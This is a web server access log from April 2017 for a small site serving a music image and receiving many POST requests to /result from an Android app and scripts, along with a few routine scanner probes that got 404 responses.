132.205.229.69 - - [13/Apr/2017:12:06:43 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:07:29 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:07:29 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:09:00 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:09:00 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:14:49 +0000] "GET / HTTP/1.1" 200 2542 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:14:49 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:14:52 +0000] "GET / HTTP/1.1" 200 2542 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:12:14:59 +0000] "GET / HTTP/1.1" 200 2542 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:15:00 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:15:05 +0000] "GET / HTTP/1.1" 200 2542 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:15:05 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:15:10 +0000] "GET / HTTP/1.1" 200 2542 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:15:11 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:16:33 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:12:16:49 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:16:49 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:16:59 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:17:00 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:12:17:02 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:17:02 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:20:36 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:20:36 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:12:21:00 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.229.69 - - [13/Apr/2017:12:21:01 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:21:08 +0000] "GET / HTTP/1.1" 200 2543 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:21:09 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:21:52 +0000] "GET / HTTP/1.1" 200 2526 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:21:53 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:22:42 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:22:43 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:23:02 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:23:03 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:23:04 +0000] "GET / HTTP/1.1" 200 2527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:23:04 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:25:45 +0000] "GET / HTTP/1.1" 200 2522 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:25:45 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:25:54 +0000] "POST / HTTP/1.1" 500 90038 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:26:16 +0000] "GET / HTTP/1.1" 200 2522 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:26:23 +0000] "POST / HTTP/1.1" 500 90076 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:26:29 +0000] "GET / HTTP/1.1" 200 2522 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:26:36 +0000] "POST / HTTP/1.1" 500 90076 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.69 - - [13/Apr/2017:12:36:13 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
24.114.58.21 - - [13/Apr/2017:12:37:23 +0000] "GET / HTTP/1.1" 200 2555 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:37:30 +0000] "POST / HTTP/1.1" 500 90039 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:38:10 +0000] "GET / HTTP/1.1" 200 2555 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:38:16 +0000] "POST / HTTP/1.1" 500 90077 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:38:56 +0000] "GET / HTTP/1.1" 200 2557 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.58.21 - - [13/Apr/2017:12:39:01 +0000] "POST / HTTP/1.1" 500 90077 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
24.114.80.245 - - [13/Apr/2017:12:54:29 +0000] "GET / HTTP/1.1" 502 181 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
23.91.241.182 - - [13/Apr/2017:13:46:11 +0000] "GET / HTTP/1.1" 200 2585 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:46:13 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:46:27 +0000] "GET / HTTP/1.1" 200 2585 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:46:28 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:47:18 +0000] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:47:19 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:47:28 +0000] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:47:28 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:48:29 +0000] "GET / HTTP/1.1" 200 2524 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:48:29 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:50:17 +0000] "GET / HTTP/1.1" 200 2526 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:13:51:21 +0000] "GET / HTTP/1.1" 200 2524 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:35:22 +0000] "GET / HTTP/1.1" 200 2535 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:35:23 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:35:27 +0000] "GET / HTTP/1.1" 200 2535 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:35:29 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:37:45 +0000] "GET / HTTP/1.1" 200 2554 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:37:46 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:39:59 +0000] "GET / HTTP/1.1" 200 2553 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:40:00 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:41:26 +0000] "GET / HTTP/1.1" 200 2553 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:41:26 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:15:44:42 +0000] "GET / HTTP/1.1" 200 2524 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:11:21 +0000] "GET / HTTP/1.1" 200 2519 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:11:21 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:15:41 +0000] "GET / HTTP/1.1" 200 2586 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:15:42 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:17:57 +0000] "GET / HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:17:59 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:24:40 +0000] "GET / HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
23.91.241.182 - - [13/Apr/2017:16:24:41 +0000] "GET /static/img/music.jpg HTTP/1.1" 304 0 "http://35.163.12.69/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"
192.222.220.68 - - [13/Apr/2017:16:55:20 +0000] "POST /result HTTP/1.1" 200 84 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
192.222.220.68 - - [13/Apr/2017:16:58:25 +0000] "POST /result HTTP/1.1" 200 63 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
183.129.160.229 - - [13/Apr/2017:17:19:20 +0000] "GET / HTTP/1.1" 200 7388 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.129.160.229 - - [13/Apr/2017:17:19:25 +0000] "GET /map_ports.html HTTP/1.1" 404 2581 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
132.205.229.125 - - [13/Apr/2017:18:04:13 +0000] "GET / HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:04:57 +0000] "GET /favicon.ico HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:05:29 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:05:29 +0000] "GET / HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:05:33 +0000] "GET /static/img/music.jpg HTTP/1.1" 200 61068 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:05:40 +0000] "GET / HTTP/1.1" 200 2645 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:06:03 +0000] "GET /static/img/music.jpg HTTP/1.1" 206 208996 "http://35.163.12.69/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:06:10 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:21:30 +0000] "GET / HTTP/1.1" 200 2660 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:23:54 +0000] "GET / HTTP/1.1" 200 2658 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.125 - - [13/Apr/2017:18:24:33 +0000] "GET / HTTP/1.1" 200 2658 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
132.205.229.109 - - [13/Apr/2017:18:32:43 +0000] "POST /result HTTP/1.1" 200 63 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:18:36:28 +0000] "POST /result HTTP/1.1" 200 70 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:18:37:43 +0000] "POST /result HTTP/1.1" 200 63 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.4.182 - - [13/Apr/2017:18:46:23 +0000] "GET / HTTP/1.1" 200 2658 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.4.182 - - [13/Apr/2017:18:46:24 +0000] "GET /favicon.ico HTTP/1.1" 404 1009 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
132.205.4.182 - - [13/Apr/2017:18:47:01 +0000] "POST /result HTTP/1.1" 200 78 "-" "curl/7.29.0"
132.205.229.109 - - [13/Apr/2017:18:50:39 +0000] "POST /result HTTP/1.1" 200 71 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
222.216.206.150 - - [13/Apr/2017:18:50:52 +0000] "GET /manager/html HTTP/1.1" 404 2893 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
24.114.105.235 - - [13/Apr/2017:18:54:30 +0000] "POST /result HTTP/1.1" 200 55 "-" "python-requests/2.13.0"
24.114.105.235 - - [13/Apr/2017:18:55:10 +0000] "POST /result HTTP/1.1" 200 55 "-" "python-requests/2.13.0"
24.114.105.235 - - [13/Apr/2017:18:55:30 +0000] "POST /result HTTP/1.1" 200 56 "-" "python-requests/2.13.0"
132.205.229.109 - - [13/Apr/2017:18:56:15 +0000] "POST /result HTTP/1.1" 200 63 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
24.114.105.235 - - [13/Apr/2017:18:56:33 +0000] "POST /result HTTP/1.1" 200 53 "-" "python-requests/2.13.0"
24.114.105.235 - - [13/Apr/2017:18:58:01 +0000] "POST /result HTTP/1.1" 200 73 "-" "python-requests/2.13.0"
132.205.229.109 - - [13/Apr/2017:18:58:05 +0000] "POST /result HTTP/1.1" 200 67 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
24.114.105.235 - - [13/Apr/2017:18:58:41 +0000] "POST /result HTTP/1.1" 200 85 "-" "python-requests/2.13.0"
24.114.105.235 - - [13/Apr/2017:18:59:03 +0000] "POST /result HTTP/1.1" 200 72 "-" "python-requests/2.13.0"
132.205.229.109 - - [13/Apr/2017:19:00:21 +0000] "POST /result HTTP/1.1" 200 62 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:04:40 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:05:51 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:10:46 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:15:17 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
188.36.250.14 - - [13/Apr/2017:19:20:30 +0000] "GET / HTTP/1.1" 200 7419 "-" "curl/7.17.1 (mips-unknown-linux-gnu) libcurl/7.17.1 OpenSSL/0.9.8i zlib/1.2.3"
132.205.229.125 - - [13/Apr/2017:19:21:25 +0000] "\x16\x03\x01\x00\xAE\x01\x00\x00\xAA\x03\x03+\xA4\xB0\x16\x9C\xFD\xFDh#WV5\x15\xF3\xD3\xDF_\x7FQe\xAA\xA8{c\xC5L/\x87\xD9g\xBBk\x00\x00 **\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xCC\x14\xCC\x13\xC0\x13\xC0\x14\x00\x9C\x00\x9D\x00/\x005\x00" 400 181 "-" "-"
132.205.229.125 - - [13/Apr/2017:19:22:29 +0000] "POST /result HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36"
132.205.229.109 - - [13/Apr/2017:19:46:51 +0000] "POST /result HTTP/1.1" 200 72 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:48:43 +0000] "POST /result HTTP/1.1" 200 72 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:50:51 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:19:52:33 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:16:47 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:19:12 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:21:18 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:28:34 +0000] "POST /result HTTP/1.1" 200 66 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:28:54 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:31:02 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:32:03 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:32:17 +0000] "POST /result HTTP/1.1" 200 56 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:33:30 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:33:53 +0000] "POST /result HTTP/1.1" 200 55 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
132.205.229.109 - - [13/Apr/2017:20:34:51 +0000] "POST /result HTTP/1.1" 200 74 "-" "Dalvik/2.1.0 (Linux; U; Android 7.0; XT1635-02 Build/NPN25.137-24-1)"
